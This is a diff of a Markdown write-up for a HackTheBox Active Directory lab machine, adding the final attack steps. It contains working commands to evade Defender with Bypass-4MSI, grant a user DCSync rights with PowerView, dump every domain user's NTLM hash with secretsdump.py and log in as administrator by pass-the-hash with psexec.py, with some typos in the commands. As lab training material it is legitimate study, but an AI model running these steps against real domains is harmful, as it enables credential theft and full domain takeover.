@@ -175,13 +175,28 @@ PS C:\Users\svc-alfresco\Documents> Bypass-4MSI
 PS C:\Users\svc-alfresco\Documents> upload /home/htb/powerview.ps1
 ```
 
-TODO...
-add powerview.ps1
-privilege escalation wit DACL 
-join with administrat account with psexc in msfconsole
-set SMBDOMAIN htb.local
-set SMBPASS `<hash>`
-set SMBUSER administrator
+- `Bypass-4MSI`: this command is used to evade defender before importing the script.
+
+Next we can create use the `Add-ObjectACL` with gabbo's credentials, and give him **DCSync** rights.
+
+```bash
+$pass = convertto-securestring 'abc123!' -asplain -force
+$cred = new-obejct system.management.automation.pscredential('htb\gabbo',$pass)
+Add-ObjectACL -PrincipalIdentity gabbo -Credential $cred -Rights DCSync
+```
+
+Once do that use the `secretsdump` script to reveal the `NTLM` hashes for all domain users.
+
+```bash
+secretsdump.py htb/gabbo@10.129.211.144
+```
+
+Now we can use `psexec.py` script or the module on `msfconsole` and login use `hash pass through` technique.
+
+```bash 
+psexec.py administrator@10.129.211.144 -hahses aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+```
+
 
 ## Loot
 
